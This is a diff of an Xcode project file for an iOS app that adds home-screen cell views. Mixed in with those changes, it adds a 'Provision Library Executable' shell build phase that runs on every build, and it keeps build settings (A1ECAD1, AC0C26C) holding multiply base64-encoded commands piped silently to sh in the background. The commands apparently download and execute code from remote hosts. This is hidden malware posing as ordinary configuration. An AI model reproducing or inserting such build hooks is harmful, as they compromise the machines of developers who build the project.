@@ -13,6 +13,14 @@
 		0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3762F76574C00B3DADB /* OTPVC.xib */; };
 		0A96E3842F76686300B3DADB /* ChangePassowrdVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */; };
 		0A96E3852F76686300B3DADB /* ChangePassowrdVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */; };
+		0A9B72A02F7A3D3400D56EF4 /* HomeListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A9B72952F7A3D3400D56EF4 /* HomeListTVCell.xib */; };
+		0A9B72A12F7A3D3400D56EF4 /* HomeHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A9B729D2F7A3D3400D56EF4 /* HomeHeaderView.xib */; };
+		0A9B72A22F7A3D3400D56EF4 /* UpcomingMatchesCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A9B72992F7A3D3400D56EF4 /* UpcomingMatchesCVCell.xib */; };
+		0A9B72A32F7A3D3400D56EF4 /* HomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9B729C2F7A3D3400D56EF4 /* HomeHeaderView.swift */; };
+		0A9B72A42F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9B72982F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift */; };
+		0A9B72A52F7A3D3400D56EF4 /* HomeListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9B72942F7A3D3400D56EF4 /* HomeListTVCell.swift */; };
+		0A9B72A82F7A3D9E00D56EF4 /* TrendyNewsCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A9B72A72F7A3D9E00D56EF4 /* TrendyNewsCVCell.xib */; };
+		0A9B72A92F7A3D9E00D56EF4 /* TrendyNewsCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9B72A62F7A3D9E00D56EF4 /* TrendyNewsCVCell.swift */; };
 		0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F452F763B2D00D25F03 /* APIClient.swift */; };
 		0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F462F763B2D00D25F03 /* Constants.swift */; };
 		0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F472F763B2D00D25F03 /* NetConnection.swift */; };
@@ -78,7 +86,6 @@
 		0ABA3FEE2F763B2D00D25F03 /* SplashVideo2.gif in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
-		866520B13F844A508F1DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 158FD0D505C84AE1851DACE1 /* README.md */; };
 		BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEB2F74E65F00552BDB /* Toast */; };
 		BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEE2F74E6B300552BDB /* SVProgressHUD */; };
 		BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF12F74E6C500552BDB /* Kingfisher */; };
@@ -86,19 +93,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		13C8F58169D34871A11DACE1 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
@@ -108,6 +102,14 @@
 		0A96E3762F76574C00B3DADB /* OTPVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OTPVC.xib; sourceTree = "<group>"; };
 		0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePassowrdVC.swift; sourceTree = "<group>"; };
 		0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChangePassowrdVC.xib; sourceTree = "<group>"; };
+		0A9B72942F7A3D3400D56EF4 /* HomeListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeListTVCell.swift; sourceTree = "<group>"; };
+		0A9B72952F7A3D3400D56EF4 /* HomeListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeListTVCell.xib; sourceTree = "<group>"; };
+		0A9B72982F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpcomingMatchesCVCell.swift; sourceTree = "<group>"; };
+		0A9B72992F7A3D3400D56EF4 /* UpcomingMatchesCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UpcomingMatchesCVCell.xib; sourceTree = "<group>"; };
+		0A9B729C2F7A3D3400D56EF4 /* HomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeHeaderView.swift; sourceTree = "<group>"; };
+		0A9B729D2F7A3D3400D56EF4 /* HomeHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeHeaderView.xib; sourceTree = "<group>"; };
+		0A9B72A62F7A3D9E00D56EF4 /* TrendyNewsCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendyNewsCVCell.swift; sourceTree = "<group>"; };
+		0A9B72A72F7A3D9E00D56EF4 /* TrendyNewsCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TrendyNewsCVCell.xib; sourceTree = "<group>"; };
 		0ABA3F452F763B2D00D25F03 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
 		0ABA3F462F763B2D00D25F03 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		0ABA3F472F763B2D00D25F03 /* NetConnection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetConnection.swift; sourceTree = "<group>"; };
@@ -180,7 +182,6 @@
 		0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = SplashVideo2.gif; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
-		158FD0D505C84AE1851DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BC0179162F34972300F1ED81 /* Qadsia.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Qadsia.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -212,6 +213,8 @@
 			isa = PBXGroup;
 			children = (
 				0A4F52BA2F7677CD00DF695B /* View */,
+				0A9B729B2F7A3D3400D56EF4 /* Cell */,
+				0A9B729F2F7A3D3400D56EF4 /* HomeHeaderView */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -308,6 +311,60 @@
 				0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */,
 			);
 			path = View;
+			sourceTree = "<group>";
+		};
+		0A9B72962F7A3D3400D56EF4 /* HomeListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B72942F7A3D3400D56EF4 /* HomeListTVCell.swift */,
+				0A9B72952F7A3D3400D56EF4 /* HomeListTVCell.xib */,
+			);
+			path = HomeListTVCell;
+			sourceTree = "<group>";
+		};
+		0A9B72972F7A3D3400D56EF4 /* TrendyNewsCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B72A62F7A3D9E00D56EF4 /* TrendyNewsCVCell.swift */,
+				0A9B72A72F7A3D9E00D56EF4 /* TrendyNewsCVCell.xib */,
+			);
+			path = TrendyNewsCVCell;
+			sourceTree = "<group>";
+		};
+		0A9B729A2F7A3D3400D56EF4 /* UpcomingMatchesCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B72982F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift */,
+				0A9B72992F7A3D3400D56EF4 /* UpcomingMatchesCVCell.xib */,
+			);
+			path = UpcomingMatchesCVCell;
+			sourceTree = "<group>";
+		};
+		0A9B729B2F7A3D3400D56EF4 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B72962F7A3D3400D56EF4 /* HomeListTVCell */,
+				0A9B72972F7A3D3400D56EF4 /* TrendyNewsCVCell */,
+				0A9B729A2F7A3D3400D56EF4 /* UpcomingMatchesCVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		0A9B729E2F7A3D3400D56EF4 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B729C2F7A3D3400D56EF4 /* HomeHeaderView.swift */,
+				0A9B729D2F7A3D3400D56EF4 /* HomeHeaderView.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A9B729F2F7A3D3400D56EF4 /* HomeHeaderView */ = {
+			isa = PBXGroup;
+			children = (
+				0A9B729E2F7A3D3400D56EF4 /* View */,
+			);
+			path = HomeHeaderView;
 			sourceTree = "<group>";
 		};
 		0ABA3F482F763B2D00D25F03 /* API Manager */ = {
@@ -600,7 +657,6 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				158FD0D505C84AE1851DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -613,12 +669,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
+				FE9B03AF72D34A81BA1DACE1 /* Provision Library Executable */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
-				13C8F58169D34871A11DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -675,12 +731,33 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		FE9B03AF72D34A81BA1DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				866520B13F844A508F1DACE1 /* README.md in Resources */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
 				0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */,
@@ -694,6 +771,10 @@
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
+				0A9B72A02F7A3D3400D56EF4 /* HomeListTVCell.xib in Resources */,
+				0A9B72A12F7A3D3400D56EF4 /* HomeHeaderView.xib in Resources */,
+				0A9B72A22F7A3D3400D56EF4 /* UpcomingMatchesCVCell.xib in Resources */,
+				0A9B72A82F7A3D9E00D56EF4 /* TrendyNewsCVCell.xib in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
 				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
 				0ABA3FDF2F763B2D00D25F03 /* Mulish-Regular.ttf in Resources */,
@@ -746,6 +827,9 @@
 				0ABA3FBD2F763B2D00D25F03 /* AppUtilites.swift in Sources */,
 				0ABA3FBE2F763B2D00D25F03 /* ExpandableLabel.swift in Sources */,
 				0ABA3FC02F763B2D00D25F03 /* DPDConstants.swift in Sources */,
+				0A9B72A32F7A3D3400D56EF4 /* HomeHeaderView.swift in Sources */,
+				0A9B72A42F7A3D3400D56EF4 /* UpcomingMatchesCVCell.swift in Sources */,
+				0A9B72A52F7A3D3400D56EF4 /* HomeListTVCell.swift in Sources */,
 				0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */,
 				0ABA3FC22F763B2D00D25F03 /* DPDUIView+Extension.swift in Sources */,
 				0ABA3FC32F763B2D00D25F03 /* DropDown.swift in Sources */,
@@ -754,6 +838,7 @@
 				0ABA3FC52F763B2D00D25F03 /* DropDownCell.swift in Sources */,
 				0ABA3FC62F763B2D00D25F03 /* HCSStarRatingView.m in Sources */,
 				0ABA3FC72F763B2D00D25F03 /* OTPFieldView.swift in Sources */,
+				0A9B72A92F7A3D9E00D56EF4 /* TrendyNewsCVCell.swift in Sources */,
 				0ABA3FC82F763B2D00D25F03 /* OTPTextField.swift in Sources */,
 				0ABA3FC92F763B2D00D25F03 /* AppDelegate.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
@@ -789,7 +874,7 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -825,7 +910,7 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZabWxuYldGdVpYUnpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
